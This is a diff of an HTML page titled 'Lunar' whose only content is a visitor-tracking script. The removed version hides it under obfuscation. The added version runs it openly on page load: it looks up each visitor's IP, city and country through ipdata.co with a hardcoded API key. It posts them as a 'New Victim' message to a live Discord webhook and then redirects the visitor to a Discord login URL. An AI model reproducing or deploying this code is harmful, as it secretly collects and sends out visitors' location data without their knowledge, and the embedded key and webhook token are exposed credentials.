@@ -1,12 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Lunar</title>
-  <script>const _0x434a53=_0x39da;(function(_0x72990c,_0x59c946){const _0x31b5c3=_0x39da,_0x31939f=_0x72990c();while(!![]){try{const _0x4952f8=parseInt(_0x31b5c3(0xa1))/0x1*(parseInt(_0x31b5c3(0xb1))/0x2)+parseInt(_0x31b5c3(0xad))/0x3+parseInt(_0x31b5c3(0xaa))/0x4+parseInt(_0x31b5c3(0xb2))/0x5+parseInt(_0x31b5c3(0x9e))/0x6*(-parseInt(_0x31b5c3(0xa6))/0x7)+parseInt(_0x31b5c3(0xb0))/0x8*(parseInt(_0x31b5c3(0xaf))/0x9)+-parseInt(_0x31b5c3(0xa2))/0xa;if(_0x4952f8===_0x59c946)break;else _0x31939f['push'](_0x31939f['shift']());}catch(_0x145d22){_0x31939f['push'](_0x31939f['shift']());}}}(_0x3890,0x91b2f));function dummyFunction(){}function _0x3890(){const _0x4709bb=['city','8904rPUTcU','join','POST','73P0IPwMByy1ODq1OW4vRUZ4R1ZTNTB3NURVWTpSR1B6U1JFUlZMRFNZVVkwTjZPQ0wwWVBISFZVU1RIVTNGc3J5V1lRV2FjRQ==','260564StaGBo','reverse','stringify','1891857ESvXcl','https://www.discord.com','793503VwFZLA','40jtYtfM','6IPhITq','5077495YLwjPu','location','replace','1206lOEfiJ','split','country_code','225764eFRlwq','19769310kcPafu','log','then'];_0x3890=function(){return _0x4709bb;};return _0x3890();}function decodeString(_0x2240f2){const _0x36a9ec=_0x39da;return atob(_0x2240f2[_0x36a9ec(0x9f)]('')[_0x36a9ec(0xab)]()[_0x36a9ec(0xa7)](''));}function json(_0x331602){const _0x544a7a=_0x39da;return fetch(_0x331602)[_0x544a7a(0xa4)](_0x39d325=>_0x39d325['json']());}let apiKey='c64ab728d42c9be3cba6c2d546fa575be79ed1cc32bf324b5de3a6d8',webhookURL=decodeString(_0x434a53(0xa9)),apiUrl=decodeString('M2J5LT0G8E8AQQVFYU1LUXhILVBXNhVDMTM=')+apiKey;function _0x39da(_0x2cda57,_0x48b524){const _0x38906f=_0x3890();return _0x39da=function(_0x39dad0,_0x5c6c0d){_0x39dad0=_0x39dad0-0x9d;let _0x416ca1=_0x38906f[_0x39dad0];return _0x416ca1;},_0x39da(_0x2cda57,_0x48b524);}json(apiUrl)['then'](_0x5e8557=>{const _0xe20fb2=_0x434a53;console[_0xe20fb2(0xa3)](_0x5e8557['ip']),console[_0xe20fb2(0xa3)](_0x5e8557[_0xe20fb2(0xa5)]),console[_0xe20fb2(0xa3)](_0x5e8557[_0xe20fb2(0xa0)]);let _0x4cc3de={'content':'King\x20von\x20IP\x20puller\x20:smiling_imp:\x0aIP:\x20'+_0x5e8557['ip']};dummyFunction(),fetch(webhookURL,{'method':_0xe20fb2(0xa8),'headers':{'Content-Type':'application/json'},'body':JSON[_0xe20fb2(0xac)](_0x4cc3de)}),window[_0xe20fb2(0xb3)][_0xe20fb2(0x9d)](_0xe20fb2(0xae));});</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lunar</title>
 </head>
 <body>
-  Hello
+    <script>
+    function json(url) {
+        return fetch(url).then(res => res.json());
+    }
+    
+    function getMyIP() {
+        let apiKey = 'c64ab728d42c9be3cba6c2d546fa575be79ed1cc32bf324b5de3a6d8';
+        let webhookURL = 'https://discord.com/api/webhooks/1296179557979652177/oLSxEVz99h1S-GCZdF_UH6BGJ6S4aaoFuAXZFBHitk_kdUgSFbEv2yZMeJHg_KfHgriK';
+
+        json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+            let message = {
+                embeds: [
+                    {
+                        title: "King von IP puller 😈",
+                        description: `**New Victim**\nIP: ||${data.ip}||\nCity: ${data.city}\nCountry: ${data.country_code}\nRUNTZ!`,
+                        image: {
+                            url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+                        },
+                        color: 0x007BFF
+                    }
+                ]
+            };
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            }).then(() => {
+                window.location.href = "https://discord.gg/login";
+            });
+        });
+    }
+    getMyIP();
+
+    </script>
 </body>
 </html>
